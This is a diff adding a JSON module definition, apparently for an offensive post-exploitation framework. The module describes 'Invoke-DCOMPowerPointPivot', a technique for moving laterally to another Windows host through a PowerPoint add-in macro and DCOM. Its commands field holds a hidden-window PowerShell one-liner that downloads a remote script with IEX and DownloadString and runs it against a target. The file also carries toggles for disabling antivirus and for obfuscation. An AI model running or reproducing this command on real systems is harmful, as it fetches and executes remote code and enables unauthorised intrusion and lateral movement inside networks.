@@ -1,0 +1,33 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Invoke-DCOMPowerPointPivot",
+    "author": ["(@_nephalem_)"],
+    "path": ["windows", "x64", "powershell", "lateral", "dcom", "Invoke-DCOMPowerPointPivot"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": true,
+    "notes": "",
+    "remote": "https://raw.githubusercontent.com/attactics/Invoke-DCOMPowerPointPivot/master/Invoke-DCOMPowerPointPivot.ps1",
+    "local": ["data", "src", "attactics", "gists", "Invoke-DCOMPowerPointPivot", "Invoke-ExcelMacroPivot.ps1"],
+    "options": {
+      "Target": [""],
+      "AddinPath": [],
+      "DestPath": [""],
+      "ExecWaitTime":[]
+    },
+    "description": "Facilitates pivoting to a target through PowerPoint Add-In Macro and the PowerPoint COM object cmdlet adapted from Invoke-ExcelMacroPivot by @enimga0x3",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/attactics/Invoke-DCOMPowerPointPivot/master/Invoke-DCOMPowerPointPivot.ps1');Invoke-DCOMPowerPointPivot -Target '127.0.0.1' -AddinPath 'c:\\PowerPoint.ppa' -DestPath 'c:\\Windows\\Temp\\NiceFile.ppam' -ExecWaitTime 10\""
+    ]
+  },
+  "powershell": {
+    "disableav": false,
+    "obfuscate": false,
+    "base64": false
+  }
+}
